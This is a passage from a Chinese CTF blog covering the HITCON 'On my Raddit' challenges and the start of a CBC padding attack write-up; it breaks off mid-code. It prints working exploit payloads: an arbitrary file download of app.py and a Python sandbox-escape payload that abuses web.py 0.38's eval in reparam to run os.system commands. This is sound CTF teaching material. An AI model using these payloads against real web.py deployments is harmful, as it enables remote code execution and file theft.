src="https://upload-images.jianshu.io/upload_images/9223743-2f4d05321b251dc6.png" alt="image.png"></p><p>把那个链接解密一下：<code>m=d&amp;f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf</code></p><p>应该可以任意下载文件，根据 hint.py 可以推断这是 python 写的，那么下载一波 app.py。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m=d&amp;f=app.py 加密得到e2272b36277c708bc21066647bc214b8</span><br><span class="line">发过去 http://13.115.255.46/?S=e2272b36277c708bc21066647bc214b8</span><br></pre></td></tr></table></figure><p>可以下到app.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line">ENCRPYTION_KEY = <span class="string">'megnnaro'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/'</span>, <span class="string">'index'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line">db = web.database(dbn=<span class="string">'sqlite'</span>, db=<span class="string">'db.db'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s = s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(s).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.decode(<span class="string">'hex'</span>)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        data = data[:-ord(data[<span class="number">-1</span>])]</span><br><span class="line">        <span class="keyword">return</span> dict(urlparse.parse_qsl(data))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e.message</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_posts</span><span class="params">(limit=None)</span>:</span></span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> db.select(<span class="string">'posts'</span>, limit=limit, order=<span class="string">'ups desc'</span>):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            <span class="string">'m'</span>: <span class="string">'r'</span>, </span><br><span class="line">            <span class="string">'t'</span>: i.title.encode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>), </span><br><span class="line">            <span class="string">'u'</span>: i.id, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[<span class="string">'param'</span>] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[<span class="string">'ups'</span>] = i.ups</span><br><span class="line">        <span class="keyword">if</span> i.file:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = encrypt(urllib.urlencode(&#123;<span class="string">'m'</span>: <span class="string">'d'</span>, <span class="string">'f'</span>: i.file&#125;))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = <span class="string">''</span></span><br><span class="line">        </span><br><span class="line">        records.append( tmp )</span><br><span class="line">    <span class="keyword">return</span> records</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_urls</span><span class="params">()</span>:</span></span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">10</span>, <span class="number">100</span>, <span class="number">1000</span>]:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'m'</span>: <span class="string">'p'</span>, </span><br><span class="line">            <span class="string">'l'</span>: i</span><br><span class="line">        &#125;</span><br><span class="line">        urls.append( encrypt(urllib.urlencode(data)) )</span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = web.input().get(<span class="string">'s'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> web.template.frender(<span class="string">'templates/index.html'</span>)(get_posts(), get_urls())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = decrypt(s)</span><br><span class="line">            method = s.get(<span class="string">'m'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">and</span> method <span class="keyword">not</span> <span class="keyword">in</span> list(<span class="string">'rdp'</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'param error'</span></span><br><span class="line">            <span class="keyword">if</span> method == <span class="string">'r'</span>:</span><br><span class="line">                uid = s.get(<span class="string">'u'</span>)</span><br><span class="line">                record = db.select(<span class="string">'posts'</span>, where=<span class="string">'id=$id'</span>, vars=&#123;<span class="string">'id'</span>: uid&#125;).first()</span><br><span class="line">                <span class="keyword">if</span> record:</span><br><span class="line">                    <span class="keyword">raise</span> web.seeother(record.url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'not found'</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'d'</span>:</span><br><span class="line">                file = s.get(<span class="string">'f'</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file):</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'not found'</span></span><br><span class="line">                name = os.path.basename(file)</span><br><span class="line">                web.header(<span class="string">'Content-Disposition'</span>, <span class="string">'attachment; filename=%s'</span> % name)</span><br><span class="line">                web.header(<span class="string">'Content-Type'</span>, <span class="string">'application/pdf'</span>)</span><br><span class="line">                <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                    data = fp.read()</span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'p'</span>:</span><br><span class="line">                limit = s.get(<span class="string">'l'</span>)</span><br><span class="line">                <span class="keyword">return</span> web.template.frender(<span class="string">'templates/index.html'</span>)(get_posts(limit), get_urls())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> web.template.frender(<span class="string">'templates/index.html'</span>)(get_posts(), get_urls())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>其实之后才了解到，orange 的本意是拿到了一个等效密钥，然后就去读到源码，这样就能看到密钥了。这句提示：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-40bf9081e40a16f1.png" alt="image.png"></p><p>当时没有注意到…就去穷举试了 (不敢写提交 flag 的脚本怕被 ban)</p><h4 id="On-my-Raddit-V2-复现"><a href="#On-my-Raddit-V2-复现" class="headerlink" title="On my Raddit V2(复现)"></a>On my Raddit V2(复现)</h4><p>web.py 审不动… 跟着师傅们复现了一波。</p><p>赛后跟 Nu1l 和 TD 的师傅请教了一波，师傅甩出的链接:<code>https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/</code>，看了半天也不知道和此题联系在哪。</p><p>才得知这题要追 web.py 的源码。</p><p>除了上面下的 app.py，还要下一个 <code>requirements.txt</code> 文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt(&quot;m=d&amp;f=requirements.txt&quot;) -&gt; fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232</span><br><span class="line">payload: ?s=fc3769d67641424d59387bf7f393b4e4d0acd96cd08fe232</span><br></pre></td></tr></table></figure><p>发现 web.py 版本是 0.38，所以这个<a href="https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/" target="_blank" rel="noopener">链接</a>的洞还没有修彻底。</p><p>开始看链接与题联系不到一起，之后才知道要追 web.py 源码。在 app.py 中这句代码：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc8bd32b2ce0df58.png" alt="image.png"></p><p>去追这个 limit：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-29e105e5b8dda3e7.png" alt="image.png"></p><p>发现代入了查询里，限制查询出的结果数。</p><p>追 web.py 的源码，也就是 <code>db.select</code> 函数，就能追到链接的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reparam</span><span class="params">(string_, dictionary)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Takes a string and a dictionary and interpolates the string</span></span><br><span class="line"><span class="string">    using values from the dictionary. Returns an `SQLQuery` for the result.</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s = $s", dict(s=True))</span></span><br><span class="line"><span class="string">        &lt;sql: "s = 't'"&gt;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s IN $s", dict(s=[1, 2]))</span></span><br><span class="line"><span class="string">        &lt;sql: 's IN (1, 2)'&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    dictionary = dictionary.copy() <span class="comment"># eval mucks with it</span></span><br><span class="line">    vals = []</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">        <span class="keyword">if</span> live:</span><br><span class="line">            v = eval(chunk, dictionary)</span><br><span class="line">            result.append(sqlquote(v))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(chunk)</span><br><span class="line">    <span class="keyword">return</span> SQLQuery.join(result, <span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>文中说了 <code>The entry points to reparam() are functions _where(), query(), and gen_clause()</code>query() 对应的就是此题的 <code>db.select</code>，这里看到了非常显眼的 eval。</p><p>根据链接中的方法构造 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import urlparse</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">ENCRPYTION_KEY = &apos;megnnaro&apos;</span><br><span class="line"></span><br><span class="line">def encrypt(s):</span><br><span class="line">    length = DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s = s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    return cipher.encrypt(s).encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">def decrypt(s):</span><br><span class="line">    try:</span><br><span class="line">        data = s.decode(&apos;hex&apos;)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        data = data[:-ord(data[-1])]</span><br><span class="line">        return dict(urlparse.parse_qsl(data))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e.message</span><br><span class="line">        return &#123;&#125;</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&apos;m&apos;: &apos;p&apos;, &apos;l&apos;: &quot;$&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls / &gt; /tmp/gml.txt&apos;))()&#125;&quot;&#125;))</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&apos;m&apos;:&apos;d&apos;,&apos;f&apos;:&apos;/tmp/gml.txt&apos;&#125;))</span><br></pre></td></tr></table></figure><p>看看根目录有啥东西，这里没有回显所以我们把执行结果写入文件再去下载：<br>执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b5bee3bac58d5ae4add21bdbd2653d63691ca068a2bd875b32f132007c8a1d5e7c12cd963db7c487ddafb51c16b96b4757</span><br><span class="line">4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27</span><br></pre></td></tr></table></figure><p>挨个访问，下载到 ls 的命令结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0cd6d84bd948876c.png" alt="image.png"></p><p>看到了 <code>read_flag</code>，执行这个应该就可以得到 flag，修改payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print encrypt(urllib.urlencode(&#123;&apos;m&apos;: &apos;p&apos;, &apos;l&apos;: &quot;$&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;/read_flag &gt; /tmp/gml.txt&apos;))()&#125;&quot;&#125;))</span><br><span class="line">print encrypt(urllib.urlencode(&#123;&apos;m&apos;:&apos;d&apos;,&apos;f&apos;:&apos;/tmp/gml.txt&apos;&#125;))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d65ae2bb276bdf2f82e5ca0761781060ba0fcf988b736644cad7a2d2573b2a14c1b40eb540be086f3aa5f06aca4d6711fda9a6f7c2c02a1ab2f85c12c3e7dea5a9c2c8651bb6f693428382a9bad41786fd02051f7cfeb780a84ffa34580feb1a50cc07436f62822e6ac2317036d4928833716d46e3c45e026435ca0c4c2720eab52bdd0761d538f8d5a5b977e3cea74591e1d2322b3d28c8c55ec1158e6ab8a6db604049da47bab499c188967f1429e4766afbc74000e282c325980adf54fe049dedb22857cad08805ac90492fb40f443d734e28b8700a935b1d479a042f03548a35227ec717b2b543324bca0702d4140e4bdc4c1ebe0ea54e28b1ed72c5f16ec1f8c82e7f139f375a806b6212666f872dfbb2d1031b37ca9e581b6f767797bd</span><br><span class="line">4373ac92f9aea2e244e5098a963b4b3c1ee96782d23e0f27</span><br></pre></td></tr></table></figure><p>挨个访问，可以得到 flag：</p><blockquote><p>hitcon{Fr0m_SQL_Injecti0n_t0_Shell_1s_C00L!!!}</p></blockquote><p>参考：</p><ol><li><p><a href="https://xz.aliyun.com/t/2953#toc-12" target="_blank" rel="noopener">Nu1l的wp</a></p></li><li><p><a href="https://xz.aliyun.com/t/2961" target="_blank" rel="noopener">https://xz.aliyun.com/t/2961</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CBC-Padding攻击</title>
      <link href="/2018/10/19/CBC-Padding%E6%94%BB%E5%87%BB/"/>
      <url>/2018/10/19/CBC-Padding%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>对于 CBC 翻转字节攻击以及 Padding Oracle Attack 这块的知识一直不怎么会运用，所以今天复现了一道在Xman 夏令营打排位赛的一道密码题，算是 Padding Oracle 的一个简化版，思想大同小异，只是这个题没有和服务器交互。</p><p>这个题也是仿 hack.lu 2016 的一道题，文章末尾有链接地址。</p><p>看下题，给了<code>AESCipher.py</code>,<code>lockfile.py</code>和<code>flag.encrypted</code>三个文件。<br>代码：</p><a id="more"></a><p>AESCipher.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line">        self.bs = <span class="number">32</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">str_to_bytes</span><span class="params">(data)</span>:</span></span><br><span class="line">        u_type = type(<span class="string">b''</span>.decode(<span class="string">'utf8'</span>))</span><br><span class="line">        <span class="keyword">if</span> isinstance(data, u_type):</span><br><span class="line">            <span class="keyword">return</span> data.encode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_pad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> s + (self.bs - len(s) % self.bs</span><br><span class="line">                   ) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_unpad</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> s[:-ord(s[len(s) - <span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">        raw = self._pad(AESCipher.str_to_bytes(raw))</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> iv + cipher.encrypt(raw)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, enc)</span>:</span></span><br><span class="line">        iv = enc[:AES.block_size]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> cipher.decrypt(enc[AES.block_size:])</span><br></pre></td></tr></table></figure><p>lockfile.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> AESCipher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLocker</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, keys)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> len(keys) == <span class="number">4</span></span><br><span class="line">        self.keys = keys</span><br><span class="line">        self.ciphers = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            self.ciphers.append(AESCipher(keys[i]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(self, plaintext)</span>:</span></span><br><span class="line">        stage1 = self.ciphers[<span class="number">0</span>].encrypt(plaintext)</span><br><span class="line">        stage2 = self.ciphers[<span class="number">1</span>].encrypt(stage1)</span><br><span class="line">        stage3 = self.ciphers[<span class="number">2</span>].encrypt(stage2)</span><br><span class="line">        ciphertext = self.ciphers[<span class="number">3</span>].encrypt(stage3)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(self, ciphertext)</span>:</span></span><br><span class="line">        stage3 = AESCipher._unpad(self.ciphers[<span class="number">3</span>].decrypt(ciphertext))</span><br><span class="line">        stage2 = AESCipher._unpad(self.ciphers[<span class="number">2</span>].decrypt(stage3))</span><br><span class="line">        stage1 = AESCipher._unpad(self.ciphers[<span class="number">1</span>].decrypt(stage2))</span><br><span class="line">        plaintext = AESCipher._unpad(self.ciphers[<span class="number">0</span>].decrypt(stage1))</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="comment"># PASSWORD SHOULD BE Visible character</span></span><br><span class="line">        print(<span class="string">"Usage: ./lockfile.py plainfile password"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    plaintext = open(filename, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line">    password = sys.argv[<span class="number">2</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">assert</span> len(password) == <span class="number">8</span></span><br><span class="line">    i = len(password) / <span class="number">4</span></span><br><span class="line">    keys = [</span><br><span class="line">        hashlib.sha256(password[<span class="number">0</span>:i]).digest(),</span><br><span class="line">        hashlib.sha256(password[i:<span class="number">2</span> * i]).digest(),</span><br><span class="line">        hashlib.sha256(password[<span class="number">2</span> * i:<span class="number">3</span> * i]).digest(),</span><br><span class="line">        hashlib.sha256(password[<span class="number">3</span> * i:<span class="number">4</span> * i]).digest(),</span><br><span class="line">    ]</span><br><span class="line">    s = FileLocker(keys)</span><br><span class="line"></span><br><span class="line">    ciphertext = s.enc(plaintext)</span><br><span class="line"></span><br><span class="line">    open(filename + <span class="string">".encrypted"</span>, <span class="string">"w"</span>).write(ciphertext)</span><br></pre></td></tr></table></figure><p>可以看到加密程序对于 key 的处理很特别，八字符的 key 被分成了四组，每组两个字符哈希后作为 AES 密钥，把明文加密了四次。采用的是下一轮加密上一轮的密文这种形式。</p><p>注意到这里的填充方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> s + (self.bs - len(s) % self.bs</span><br><span class="line">                  ) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))</span><br></pre></td></tr></table></figure><p>采用的是类似 PKCS5 的填充方式，也就是说无论明文多少位都需要填充。</p><p>直接爆破八个字符显然不可能，数量级是<code>len(dict)^8</code>,我们考虑把每步分解，如果四轮加密中，每一轮都能知道当前的两个字符是否正确，那么数量级就变成了<code>4*(len(dict)^2)</code>,还是很容易的。</p><p>既然使用了这个填充规则，每一轮就可以通过判断解密后的最后填充来判断解密密钥是否正确，这是判断填充正确与否的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPadding</span><span class="params">(raw)</span>:</span></span><br><span class="line">    s=raw[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> s==chr(<span class="number">0</span>) <span class="keyword">or</span> s==chr(<span 